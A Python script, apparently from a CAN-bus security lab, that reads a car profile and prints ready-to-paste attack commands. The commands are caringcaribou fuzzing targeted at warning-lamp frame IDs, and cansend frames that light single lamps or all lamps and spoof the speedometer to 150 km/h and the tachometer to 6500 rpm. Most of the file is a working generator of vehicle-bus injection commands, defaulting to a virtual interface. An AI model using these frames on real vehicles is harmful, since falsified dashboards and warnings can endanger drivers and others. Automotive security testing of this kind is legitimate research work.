#!/usr/bin/env python3
"""
targets.py - print the attack surface of a car profile.

Random fuzzing rarely hits anything (1 ID in 2048). This prints the IDs that
actually DO something, plus ready-to-paste caringcaribou / cansend commands.

    ./.venv/bin/python scripts/targets.py prius
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from canframe import encode_signal          # noqa: E402
from common import load_profile, resolve    # noqa: E402

car = sys.argv[1] if len(sys.argv) > 1 else "prius"
iface = sys.argv[2] if len(sys.argv) > 2 else "vcan0"
prof = load_profile(resolve(car))

print(f"\n=== {prof['name']} : what actually reacts ===\n")

print("DASHBOARD CHANNELS")
for ch, m in sorted(prof["channels"].items()):
    print(f"  {ch:11} 0x{m['frame_id']:03X}  {m['message']}.{m['signal']}"
          f"  bits {m['start_bit']}+{m['length']}")

lamps = prof.get("lamps", {})
if lamps:
    print("\nWARNING LAMPS")
    for name, m in lamps.items():
        syn = " (synthetic)" if m.get("synthetic") else ""
        print(f"  {name:11} 0x{m['frame_id']:03X}  bit {m['start_bit']}"
              f"  {m['signal']}{syn}")

    lamp_ids = sorted({m["frame_id"] for m in lamps.values()})
    print("\nTARGETED ATTACKS  (random fuzzing only hits 1 ID in 2048)")
    for fid in lamp_ids:
        print(f"  # light every lamp on 0x{fid:03X}, one bit at a time:")
        print(f"  caringcaribou -i {iface} fuzzer brute "
              f"0x{fid:03X} ..00000000000000")
    print()
    for name, m in list(lamps.items())[:3]:
        buf = bytearray(m["dlc"])
        encode_signal(buf, m, 1)
        print(f"  # {name} on:")
        print(f"  cansend {iface} {m['frame_id']:03X}#{buf.hex().upper()}")

print("\nALL-LAMPS-ON frame")
if lamps:
    by_frame = {}
    for name, m in lamps.items():
        buf = by_frame.setdefault(m["frame_id"], bytearray(m["dlc"]))
        encode_signal(buf, m, 1)
    for fid, buf in by_frame.items():
        print(f"  cansend {iface} {fid:03X}#{buf.hex().upper()}")

print("\nSPEEDO / RPM SPOOF")
for ch, val in (("speed", 150), ("rpm", 6500)):
    m = prof["channels"].get(ch)
    if not m:
        continue
    v = val / m.get("to_kmh", 1.0) if ch == "speed" else val
    buf = bytearray(m["dlc"])
    encode_signal(buf, m, v)
    unit = "km/h" if ch == "speed" else "rpm"
    print(f"  # {ch} = {val} {unit}")
    print(f"  cansend {iface} {m['frame_id']:03X}#{buf.hex().upper()}")
print()
